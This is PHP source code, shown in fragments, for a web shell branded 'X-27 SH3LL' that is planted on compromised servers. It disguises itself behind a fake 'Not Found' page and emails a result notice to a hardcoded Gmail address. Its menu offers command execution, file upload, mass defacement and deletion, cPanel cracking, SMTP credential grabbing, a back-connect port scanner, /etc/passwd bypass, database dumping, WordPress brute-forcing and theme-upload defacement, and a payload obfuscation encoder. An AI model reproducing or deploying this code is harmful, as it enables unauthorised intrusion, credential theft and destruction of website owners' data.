<?php NoneNoneNone ?><?php
session_start();
error_reporting(0);
set_time_limit(0);
$auth_pass = "8cc37ca19909d7093b3a80dca050b256"; ////////ngasalshell
...
<?php
    ...
    $ken = rand(1, 99999);
    $subj98 = " Result shell |$ken";
    $email = "dikanarzo@gmail.com";
    $from = "From: MANTAP";
...
<h1>Not Found</h1>
<p>The requested URL /kontol was not found on this server.</p>
...
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? " < fontcolor = red > ON < / font > " : " < fontcolor = lime > OFF < / font > ";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? " < fontcolor = lime > ON < / font > " : " < fontcolor = red > OFF < / font > ";
$curl = (function_exists('curl_version')) ? " < fontcolor = lime > ON < / font > " : " < fontcolor = red > OFF < / font > ";
$wget = (exe('wget --help')) ? " < fontcolor = lime > ON < / font > " : " < fontcolor = red > OFF < / font > ";
$perl = (exe('perl --help')) ? " < fontcolor = lime > ON < / font > " : " < fontcolor = red > OFF < / font > ";
$python = (exe('python --help')) ? " < fontcolor = lime > ON < / font > " : " < fontcolor = red > OFF < / font > ";
$show_ds = (!empty($ds)) ? " < fontcolor = red > $ds < / font > " : " < fontcolor = lime > NONE < / font > ";
...
echo "Komputer : < fontcolor = lime > ".$kernel." < / font > < br > ";
echo "Pengguna: < fontcolor = lime > ".$user." < / font > (".$uid.") Group: < fontcolor = lime > ".$group." < / font > (".$gid.") < br > ";
echo "JaringanAnda: < fontcolor = lime > ".$ip." < / font > | IpAnda: < fontcolor = lime > ".$_SERVER['REMOTE_ADDR']." < / font > < br > ";
echo "Hardisk: < fontcolor = lime > $used < / font > / < fontcolor = lime > $total < / font > (Bebas: < fontcolor = lime > $freespace < / font >) < br > ";
echo "ModePenyelamat:
                            $sm < br > ";
echo "Function dimatikan:
                                $show_ds < br > ";
echo "MySQL:
                                    $mysql | Perl:
                                        $perl | Python:
...
echo " < hr > ";
echo " < center > ";
echo " < br > < linkhref = 'http://fonts.googleapis.com/css?family=Iceland'rel = 'stylesheet'type = 'text/css' > < fontface = 'cardo'size = '7'color = 'yellow' > X - 27 < / font > < fontface = 'iceland'size = '7'color = 'red' > SH3LL < / font > ";
echo " < ul > < fontface = 'iceland'size = '3.8'color = 'red' > ";

echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?' > Home < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=upload' > Upload < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=cmd' > Command < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=mass_deface' > MassDeface < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=mass_delete' > MassDelete < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=config' > Config < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=jumping' > Jumping < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=cpanel' > CPanelCrack < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=smtp' > SMTPGrabber < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=zoneh' > Zone - H < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=cgi' > CGITelnet < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=network' > network < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=adminer' > Adminer < / a > < / li > ";
echo " < p > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=fake_root' > FakeRoot < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=auto_edit_user' > AutoEditUser < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=auto_wp' > AutoEditTitleWordPress < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=auto_dwp' > WordPressAutoDeface < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=auto_dwp2' > WordPressAutoDefaceV.2 < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=cpftp_auto' > CPanel / FTPAutoDeface < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=krdp_shell' > K - RDPShell < / a > < / li > ";
echo " < p > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=defacerid' > DefacerID < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=csrf' > CSRFOnline < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=backconnect' > BackConnect < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=wpbf' > WordPressBrute < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=hashid' > HashIdentification < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=symlink' > Symlink < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=passwbypass' > BypassEtc / Passw < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?dir=$dir&do=dbdump' > DBDump < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?do=decode' > DecodeText < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?do=shelscan' > FinderShell < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?do=encode' > EncodeText < / a > < / li > ";
echo " < p > ";
echo " < li > < astyle = 'border:2px solid #FFFF00;width:80px;padding:0px 8px 0px 8px;'href = '?do=md5' > MD5 < / a > < / li > ";
echo " < li > < astyle = 'border:2px solid darkred;width:80px;padding:0px 8px 0px 8px;'href = '?logout=true' > Logout < / a > < / li > < p > ";

echo " < fontsize'5' > CurrentDIR:
                                                        ";
...
<form method='POST' >
&nbsp;&nbsp;[+] Code = <br/>
&nbsp;&nbsp;<textarea class='input' cols='10' rows='1' name='string' style='border: 0;background-color: transparent;color: #FFF;'></textarea><br/>
&nbsp;&nbsp;
<br/>
&nbsp;&nbsp;<input class='input' type='submit' name='submit' value='submit' style='border: 0;background-color: transparent;color: #FFF;'><br/><br/>";
...
");
 ...
 elseif($_GET['do'] == 'encode') {
echo "<pre>
<form method='POST' >
&nbsp;&nbsp;[+] Text = <br/>
&nbsp;&nbsp;<textarea class='input' cols='80' rows='5' name='string' style='border: 0;background-color: transparent;color: #FFF;'></textarea><br/>
&nbsp;&nbsp;<select class='input' size='1' name='opsi' style='border: 0;background-color: transparent;color: #FFF;'>
<option value='base64'>base64</option>
<option value='str'>str_rot13 - base64</option>
<option value='gz'>gzinflate - str_rot13 - base64</option>
<option value='str2'>str_rot13 - gzinflate - str_rot13 - base64</option>
</select><br/>
&nbsp;&nbsp;<input class='input' type='submit' name='submit' value='submit' style='border: 0;background-color: transparent;color: #FFF;'><br/><br/>";
$submit = $_POST['submit'];
if(isset($submit)){$op = $_POST["opsi"];
switch ($op){
    case 'base64' : $code = base64_encode($s);
    break;
    case 'str' : $code = (base64_encode(str_rot13($s)));
    break;
    case 'gz' : $code = (base64_encode(str_rot13(gzdeflate($s))));
    break;
    case 'str2' : $code = (base64_encode(str_rot13(gzdeflate(str_rot13($s)))));
    break;
    default:break;}}


    echo "<textarea cols='80' rows='10' style='border: 0;background-color: transparent;color: #FFF;' readonly>".$code."</textarea><br/><br/></pre>";
}
 ...
 elseif($_GET['do'] == 'backconnect') {
    ...
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
        ...
        for($i = $start; $i<=$end; $i++){
            ...
            if($fp){
                echo 'Port '.$i.' is <font color=red>open</font><br>';
            }
            flush();
        }
    } else {
...
", $this->open));
        ...
        private function Xcurl() {
            ...
            $this->cool();
            if($http == 302) {
                 echo "<font color='red'> <br/>[+] Success [+] Tinggal Login Aja</font><br>";
                 break;
            } else {
                                                            ...
                                                            foreach ($link_config as $dir_config) {
                                                                ...
                                                                if (preg_match("/WordPress/", $config)) {
                                                                    ...
                                                                    if (!$conn OR !$db OR !$update) {
                                                                        ...
                                                                        $fp5 = fopen($www, "w");
                                                                        fputs($fp5, $upload3);
                                                                        $post2 = array("_wpnonce" => "$anu2", "_wp_http_referer" => "/wp-admin/theme-install.php?upload", "themezip" => "@$www", "install-theme-submit" => "Install Now",);
...
" . exe("ps aux | grep bc.pl") . "</pre>";
    ...
    <input type='submit' name='do_rename' value='rename'>
            ...
            <th class="th_home"><center>Action</center></th>
                                                        ...
                                                        echo "<center>Copyright &copy; " . date("Y") . " - <font color=dimgray>Thanks:N45HT ~ Mr.XoX ~ SCYTHE404_LOL ~ Shinchan ~ Noob_Orb</font></a></center>";
                                                    }
?>
</html>
